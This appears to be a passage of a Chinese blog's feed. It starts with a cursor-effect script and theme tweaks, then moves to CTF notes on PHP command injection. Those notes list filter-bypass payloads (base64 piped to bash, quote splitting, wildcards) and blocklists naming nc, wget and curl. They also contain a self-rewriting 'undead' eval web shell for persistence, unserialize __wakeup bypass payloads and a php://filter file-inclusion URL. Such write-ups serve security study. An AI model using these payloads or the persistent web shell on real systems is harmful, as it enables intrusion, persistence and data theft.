<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function cherry() &#123;</span><br><span class="line">  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]</span><br><span class="line">  var width = window.innerWidth;</span><br><span class="line">  var height = window.innerHeight;</span><br><span class="line">  var cursor = &#123;x: width/2, y: width/2&#125;;</span><br><span class="line">  var particles = [];</span><br><span class="line">  </span><br><span class="line">  function init() &#123;</span><br><span class="line">    bindEvents();</span><br><span class="line">    loop();</span><br><span class="line">  &#125;  </span><br><span class="line">  // Bind events that are needed</span><br><span class="line">  function bindEvents() &#123;</span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);</span><br><span class="line">    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);</span><br><span class="line">    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);</span><br><span class="line">    </span><br><span class="line">    window.addEventListener(&#x27;resize&#x27;, onWindowResize);</span><br><span class="line">  &#125;  </span><br><span class="line">  function onWindowResize(e) &#123;</span><br><span class="line">    width = window.innerWidth;</span><br><span class="line">    height = window.innerHeight;</span><br><span class="line">  &#125; </span><br><span class="line">  function onTouchMove(e) &#123;</span><br><span class="line">    if( e.touches.length &gt; 0 ) &#123;</span><br><span class="line">      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;</span><br><span class="line">        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function onMouseMove(e) &#123;    </span><br><span class="line">    cursor.x = e.clientX;</span><br><span class="line">    cursor.y = e.clientY;</span><br><span class="line">    </span><br><span class="line">    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">  &#125;</span><br><span class="line">  function addParticle(x, y, color) &#123;</span><br><span class="line">    var particle = new Particle();</span><br><span class="line">    particle.init(x, y, color);</span><br><span class="line">    particles.push(particle);</span><br><span class="line">  &#125;</span><br><span class="line">  function updateParticles() &#123;</span><br><span class="line">    for( var i = 0; i &lt; particles.length; i++ ) &#123;</span><br><span class="line">      particles[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;</span><br><span class="line">      if( particles[i].lifeSpan &lt; 0 ) &#123;</span><br><span class="line">        particles[i].die();</span><br><span class="line">        particles.splice(i, 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function loop() &#123;</span><br><span class="line">    requestAnimationFrame(loop);</span><br><span class="line">    updateParticles();</span><br><span class="line">  &#125;</span><br><span class="line">  function Particle() &#123;</span><br><span class="line">    this.character = &quot;*&quot;;</span><br><span class="line">    this.lifeSpan = 120; //ms</span><br><span class="line">    this.initialStyles =&#123;</span><br><span class="line">      &quot;position&quot;: &quot;fixed&quot;,</span><br><span class="line">      &quot;top&quot;: &quot;0&quot;, //必须加</span><br><span class="line">      &quot;display&quot;: &quot;block&quot;,</span><br><span class="line">      &quot;pointerEvents&quot;: &quot;none&quot;,</span><br><span class="line">      &quot;z-index&quot;: &quot;10000000&quot;,</span><br><span class="line">      &quot;fontSize&quot;: &quot;20px&quot;,</span><br><span class="line">      &quot;will-change&quot;: &quot;transform&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.init = function(x, y, color) &#123;</span><br><span class="line">      this.velocity = &#123;</span><br><span class="line">        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),</span><br><span class="line">        y: 1</span><br><span class="line">      &#125;;</span><br><span class="line">      this.position = &#123;x: x - 10, y: y - 20&#125;;</span><br><span class="line">      this.initialStyles.color = color;</span><br><span class="line">      console.log(color);</span><br><span class="line"></span><br><span class="line">      this.element = document.createElement(&#x27;span&#x27;);</span><br><span class="line">      this.element.innerHTML = this.character;</span><br><span class="line">      applyProperties(this.element, this.initialStyles);</span><br><span class="line">      this.update();</span><br><span class="line">      </span><br><span class="line">      document.body.appendChild(this.element);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.update = function() &#123;</span><br><span class="line">      this.position.x += this.velocity.x;</span><br><span class="line">      this.position.y += this.velocity.y;</span><br><span class="line">      this.lifeSpan--;</span><br><span class="line">      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    this.die = function() &#123;</span><br><span class="line">      this.element.parentNode.removeChild(this.element);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function applyProperties( target, properties ) &#123;</span><br><span class="line">    for( var key in properties ) &#123;</span><br><span class="line">      target.style[ key ] = properties[ key ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="在themes-next-layout新建文件夹-custom"><a href="#在themes-next-layout新建文件夹-custom" class="headerlink" title="在themes\next\layout新建文件夹_custom"></a>在themes\next\layout新建文件夹_custom</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;%- if theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- elseif theme.cursor_effect.type == &quot;cherry&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/cherry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="在themes-next-layout下找到-layout-swig，添加下面代码"><a href="#在themes-next-layout下找到-layout-swig，添加下面代码" class="headerlink" title="在themes\next\layout下找到_layout.swig，添加下面代码"></a>在themes\next\layout下找到_layout.swig，添加下面代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% include &#x27;_custom/custom.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最后在主题配置文件-config-yml，添加下面代码，type选择不同特效"><a href="#最后在主题配置文件-config-yml，添加下面代码，type选择不同特效" class="headerlink" title="最后在主题配置文件_config.yml，添加下面代码，type选择不同特效"></a>最后在主题配置文件_config.yml，添加下面代码，type选择不同特效</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cherry: 樱花 | explosion：爆炸 </span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: cherry </span><br></pre></td></tr></table></figure>

<h2 id="设置透明度"><a href="#设置透明度" class="headerlink" title="设置透明度"></a>设置透明度</h2><p>单独给每个区域设置opacity会出现很多问题，例如搜索框弹出会被覆盖图层导致无法进行本地搜索</p>
<p>最理想是进行全局设置，在 <code>blog\source\_data\styles.styl</code> 中 直接设置body的透明度为0.85 全体透明化，opacity的值可以自行调整</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//背景图片设置</span><br><span class="line">body &#123;</span><br><span class="line">    background-image: url(/images/bg1.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed;</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    opacity: 0.85;</span><br><span class="line">    //可选</span><br><span class="line">    +mobile()&#123;</span><br><span class="line">      background-image: url(https://ziyuan.lruihao.cn/images/bg_cell.png);</span><br><span class="line">      background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="樱花飘落特效"><a href="#樱花飘落特效" class="headerlink" title="樱花飘落特效"></a>樱花飘落特效</h1><p><a href="https://bobboss.github.io/posts/ac603ad1.html">樱花飘落特效 | BobBoss Blog</a></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行技巧</title>
    <url>/2023/01/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>php的include可以载入一个外部php文件，其参数是一个文件名，既然是文件名，就不能带参数了。</p>
<p>php中，如果include载入的文件一定要带参数，就只有一种办法，即这个参数是一个全路径的URL地址。</p>
<span id="more"></span>

<p>windows 下</p>
<blockquote>
<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<p>Linux 下</p>
<blockquote>
<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9` //$1改成$加其他数字貌似都行</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>执行代码函数</p>
<p><code>eval()</code><br><code>assert()</code><br><code>preg_replace()</code><br><code>create_function()</code><br><code>array_map()</code><br><code>call_user_func()</code><br><code>call_user_func_array()</code><br><code>array_filter</code><br><code>usort</code><br><code>uasort()</code></p>
<p>${}:中间的php代码将会被解析</p>
<p>命令执行函数</p>
<p>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p>
<p>PHP 支持一个执行运算符：反引号（&#96;）。注意这不是单引号！PHP    将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“”的效果与函数    shell_exec() 相同。</p>
<ul>
<li><p>文件包含函数：</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>文件读取函数：</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
</li>
</ul>
<h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote>
<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:   &#x2F;&#x2F; uniq 命令用于检查及删除文本文件中重复出现的行列<br>file -f:报错出具体内容</p>
<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure>
</blockquote>
<p>base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash //cat flag</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash   //cat /flag</span><br></pre></td></tr></table></figure>

<p>情况下可尝试sh)</p>
<p>单引号、双引号</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>反斜线</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #查看当前目录的所有文件的内容。</span><br><span class="line"></span><br><span class="line">cat *     #查看当前目录的所有文件的内容。</span><br></pre></td></tr></table></figure>

<p><strong>“.&#x2F;“：代表目前所在的目录。</strong></p>
<p><strong>“ . .&#x2F;“代表上一层目录。</strong></p>
<p><strong>“&#x2F;“：代表根目录。</strong></p>
<p>web135无回显，命令长度限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;ls;  //相当于执行</span><br><span class="line">eval(`$F` ;);</span><br><span class="line">``$F` ;ls;`</span><br></pre></td></tr></table></figure>

<p>另解cp命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p> mv source_file(文件) dest_file(文件)</p>
<p>将源文件名 source_file 改为目标文件名 dest_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>没有回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1</span><br><span class="line">?c=nl /f149_15_h3r3|tee 1</span><br><span class="line">?c=awk &#x27;/f/&#x27; /f149_15_h3r3|tee 1 // awk -f [file] 调用脚本</span><br></pre></td></tr></table></figure>

<p>awk 命令也是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理</p>
<p>从脚本文件中读取 awk 脚本指令，以取代直接在命令行中输入指令</p>
<p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持</title>
    <url>/2023/05/03/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[<p>  权限维持</p>
<span id="more"></span>

<h2 id="web670-web676"><a href="#web670-web676" class="headerlink" title="web670-web676"></a>web670-web676</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 题目说明：</span></span><br><span class="line"><span class="comment">// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://checker/api/check&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;params not validate&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>种入不死马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界web</title>
    <url>/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
    <content><![CDATA[<p>  攻防世界web</p>
   <span id="more"></span>

<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><code>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。</code></p>
<p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;}</p>
<p>这里的O呢就是object对象的意思</p>
<p>数字7代表着对象的函数名有7个占位</p>
<p>然后就是对象名了</p>
<p>这个数字1表示对象里有一个变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p><code>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new xctf();</span><br><span class="line">print(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>run 结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>更改属性跳过__wake</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>cyberpeace{80472bc9cb95f5a442c6b980d0a2f2ed}</p>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p><code>@</code>是可以屏蔽函数执行过程中遇到问题而产生的一些错误、警告信息，这样用户就看不到程序的出错信息。这样除了用户界面会友好一些外，更重要的是安全性，因为屏蔽了出错文件的路径等信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//\d匹配数字，oc:+4绕过</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$c</span>); <span class="comment">//反复测试不能手动改，由于反序列化后出现乱码，复制之后会改变导致序列化结果不一样，只能由str_replace替换，否则base64编码不一样。无法爆出结果。找了20分钟的原因。。。</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>

<p>ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}</p>
<h3 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $file1 = $_GET[&quot;file1&quot;];</span><br><span class="line">    $file2 = $_GET[&quot;file2&quot;];</span><br><span class="line">    if(!empty($file1) &amp;&amp; !empty($file2))</span><br><span class="line">    &#123;</span><br><span class="line">        if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;NONONO&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63403/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>

<p>同时hackbar传参hello ctf</p>
<p>cyberpeace{e0487d7ed7e17a96dea9922a9a1d19a2}</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span 